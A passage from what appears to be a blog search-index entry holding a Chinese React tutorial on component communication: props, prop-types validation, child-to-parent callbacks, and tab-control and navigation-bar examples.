          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React组件通信</title>
      <link href="/2023/07/26/frontend/react/react-zu-jian-tong-xin/"/>
      <url>/2023/07/26/frontend/react/react-zu-jian-tong-xin/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>在组件之间是存在嵌套关系的，如果我们将一个程序的所有逻辑都放在一个组件中。那么这个组件就会变得臃肿并且难以维护，所以组件化的思想就是对组件进行拆分，再将这些组件嵌套在一起，最终形成我们的应用程序。</p><p>比如，下面的组件就存在如下的关系：<br />● App 组件是 Header、Main、Footer 组件的父组件；<br />● Main 组件是 Banner、ProductList 组件的父组件；</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605694221776-cedd8caa-f4c1-4e7b-86df-084bce1ee93c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605694221776-cedd8caa-f4c1-4e7b-86df-084bce1ee93c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>在开发的过程中，组件之间是会存在数据通信的，这包括父子组件的通信，兄弟组件之间的通信，祖孙组件之间的通信等等。</p><p><a name="FvnK0"></a></p><h2 id="1-父传子通信"><a href="#1-父传子通信" class="headerlink" title="1. 父传子通信"></a>1. 父传子通信</h2><p>父子组件之间的通信是通过<code>props</code>来完成的。<br><a name="GSkrm"></a></p><h3 id="（1）类组件父传子"><a href="#（1）类组件父传子" class="headerlink" title="（1）类组件父传子"></a>（1）类组件父传子</h3><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ChildCpn</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="comment">// 实际上下面三行代码就是默认的方式，所以是可以省略的</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;name, age, height&#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>子组件展示数据: &#123;name + &quot; &quot; + age + &quot; &quot; + height&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">ChildCpn</span> <span class="attr">name</span>=<span class="string">&quot;zhangsan&quot;</span> <span class="attr">age</span>=<span class="string">&quot;18&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1.88&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">ChildCpn</span> <span class="attr">name</span>=<span class="string">&quot;lisi&quot;</span> <span class="attr">age</span>=<span class="string">&quot;20&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1.98&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="lexTn"></a></p><h3 id="（2）函数组件父传子"><a href="#（2）函数组件父传子" class="headerlink" title="（2）函数组件父传子"></a>（2）函数组件父传子</h3><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ChildCpn</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name, age, height &#125; = props;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;name + age + height&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">ChildCpn</span> <span class="attr">name</span>=<span class="string">&quot;zhangsan&quot;</span> <span class="attr">age</span>=<span class="string">&quot;18&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1.88&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">ChildCpn</span> <span class="attr">name</span>=<span class="string">&quot;lisi&quot;</span> <span class="attr">age</span>=<span class="string">&quot;20&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1.98&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="fLO0o"></a></p><h3 id="（3）属性验证"><a href="#（3）属性验证" class="headerlink" title="（3）属性验证"></a>（3）属性验证</h3><p>对于传递给子组件的数据，有时候我们可能希望进行数据格式的验证，特别是对于大型项目来说：<br />● 如果项目中默认集成了<code>Flow</code>或者<code>TypeScript</code>，那么直接就可以进行类型验证；<br />● 如果没有使用<code>Flow</code>或者<code>TypeScript</code>，也可以通过 <code>prop-types</code> 库来进行参数验证；</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一步：引入prop-types 库</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">PropTypes</span> <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二部：设置数据的类型</span></span><br><span class="line"><span class="title class_">ChildCpn</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="title class_">PropTypes</span>.<span class="property">string</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="title class_">PropTypes</span>.<span class="property">nimber</span>,</span><br><span class="line">  <span class="attr">height</span>: <span class="title class_">PropTypes</span>.<span class="property">number</span>,</span><br><span class="line">  <span class="attr">names</span>: <span class="title class_">PropTypes</span>.<span class="property">array</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />当对数据进行验证时，如果数据的类型不符，就会报错。</p><p>如果父子组件什么都没传递，我们可以给数据设置默认值，这样就可以显示默认值：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ChildCpn</span>.<span class="property">defaultProps</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;React&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">30</span>,</span><br><span class="line">  <span class="attr">height</span>: <span class="number">1.88</span>,</span><br><span class="line">  <span class="attr">names</span>: [<span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>, <span class="string">&quot;ccc&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />以上做法在类组件和函数组件中都适用，除了上述方法，在类组件中还可以使用另外一种形式来进行数据验证以及设置默认数据：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ChildCpn2</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="comment">// es6中的class fields写法</span></span><br><span class="line">  <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> defaultProps = &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="TyRU0"></a></p><h2 id="2-子传父通信"><a href="#2-子传父通信" class="headerlink" title="2. 子传父通信"></a>2. 子传父通信</h2><p>说完父传子，下面来说一下子组件向父组件传值。在 Vue 中，子组件向父组件传值是通过自定义事件来完成的，在 React 中同样是<strong>使用 props 传递信息，只要让父组件给子组件传递一个绑定了自身上下文的回调函数，那么在子组件中调用这个函数时，就可以将想要交给父组件的数据以函数入参的形式给出去</strong>，以此来间接地实现数据从子组件到父组件的流动。</p><p>具体实现步骤如下：<br />1. 父组件将回调函数通过 <code>props</code> 传递给子组件；<br />2. 子组件把父组件需要的数据信息作为回调函数的参数传递；<br />3. 子组件调用该回调函数。</p><p>下面来看一下计数器的案例：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CounterButton</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; onClick &#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;</span> <span class="attr">onClick</span> &#125;&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前计数: &#123;this.state.counter&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">CounterButton</span> <span class="attr">onClick</span> = <span class="string">&#123;e</span> =&gt;</span> this.increment()&#125; name=&quot;why&quot;/&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">increment</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">counter</span> + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这里，我们在父组件定义了一个<code>increment</code>方法，当点击子组件的按钮时，就会触发父组件的方法，并执行该方法，实现数据加一。<br><a name="tYGLe"></a></p><h2 id="3-父子组件通信案例"><a href="#3-父子组件通信案例" class="headerlink" title="3. 父子组件通信案例"></a>3. 父子组件通信案例</h2><p>我们来实现一个菜单栏的切换效果（点击菜单显示不同的内容）：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1606554603624-679dc46f-cc8f-44b6-983f-cce91a053ef9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1606554603624-679dc46f-cc8f-44b6-983f-cce91a053ef9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>样式：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// style<span class="selector-class">.css</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-control</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">44px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">44px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-item</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-item</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-item</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.tab-item</span><span class="selector-class">.active</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">3px</span> solid red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><strong>父组件（负责切换前后页面的显示）：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// App.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">TabControl</span> <span class="keyword">from</span> <span class="string">&#x27;./TabControl&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">titles</span> = [<span class="string">&#x27;新款&#x27;</span>, <span class="string">&#x27;精选&#x27;</span>, <span class="string">&#x27;流行&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">currentTitle</span>: <span class="string">&quot;新款&quot;</span>,</span><br><span class="line">      <span class="attr">currentIndex</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;currentTitle&#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">TabControl</span> <span class="attr">itemClick</span>=<span class="string">&#123;index</span> =&gt;</span> this.itemClick(index)&#125; titles=&#123;this.titles&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;currentTitle&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">itemClick</span>(<span class="params">index</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">currentTitle</span>: <span class="variable language_">this</span>.<span class="property">titles</span>[index]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><strong>子组件（只负责页面菜单的切换）：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">PropTypes</span> <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">TabControl</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">currentIndex</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; titles &#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123;currentIndex&#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;tab-control&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;</span></span><br><span class="line"><span class="language-xml">          titles.map((item, index) =&gt; &#123;</span></span><br><span class="line"><span class="language-xml">            return (</span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">key</span> = <span class="string">&#123;item&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                   <span class="attr">className</span> = <span class="string">&#123;</span>&quot;<span class="attr">tab-item</span> &quot; + (<span class="attr">index</span> === <span class="string">currentIndex</span> ? &quot;<span class="attr">active</span>&quot;<span class="attr">:</span> &quot;&quot;)&#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                   <span class="attr">onClick</span> = <span class="string">&#123;e</span> =&gt;</span> this.itemClick(index)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            )</span></span><br><span class="line"><span class="language-xml">          &#125;)</span></span><br><span class="line"><span class="language-xml">        &#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">itemClick</span>(<span class="params">index</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">currentIndex</span>: index</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123;itemClick&#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line">    <span class="title function_">itemClick</span>(index);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">TabControl</span>.<span class="property">propTypes</span> = &#123;</span><br><span class="line">  <span class="attr">titles</span>: <span class="title class_">PropTypes</span>.<span class="property">array</span>.<span class="property">isRequired</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="x993s"></a></p><h2 id="4-React-中的”插槽”"><a href="#4-React-中的”插槽”" class="headerlink" title="4. React 中的”插槽”"></a>4. React 中的”插槽”</h2><p>学过 Vue 的一定知道，Vue 有一个功能就是插槽，插槽方便了组件的自定义，避免了代码的重复。React 是没有插槽这个概念的，但是 React 的灵活性让他比插槽更加好用，下面来看一个导航栏案例：</p><p><strong>样式：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-bar</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-item</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">44px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">44px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-left</span>, <span class="selector-class">.nav-right</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">70px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.nav-center</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><strong>父组件：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">NavBar1</span> <span class="keyword">from</span> <span class="string">&#x27;./NavBar1&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">NavBar2</span> <span class="keyword">from</span> <span class="string">&#x27;./NavBar2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> leftJsx = <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span>;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        // 双标签</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavBar1</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span 